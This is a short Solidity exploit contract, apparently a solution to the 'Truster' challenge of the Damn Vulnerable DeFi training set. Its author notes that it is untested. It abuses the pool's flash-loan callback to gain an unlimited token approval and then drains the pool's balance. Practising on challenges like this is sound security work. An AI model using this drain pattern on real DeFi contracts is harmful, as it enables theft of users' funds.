//Ref: https://www.youtube.com/watch?v=Qq1hr_Im4Bk&list=PLO5VPQH6OWdXKPThrch6U0imGdD3pHLXi&index=3&ab_channel=SmartContractProgrammer
//Ref: https://github.com/t4sk/damn-vulnerable-defi/blob/master/contracts/truster/TrusterLenderPool.sol
// I have not tried this solution.
contract TrusterExploit {
    function attack(address _pool, address _token) public {
        TrusterLenderPool pool = TrusterLenderPool(_pool);
        IERC20 token = IERC20(_token);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            uint(-1)
        );

        pool.flashLoan(0, msg.sender, _token, data);

        token.transferFrom(_pool, msg.sender, token.balanceOf(_pool));
    }
}
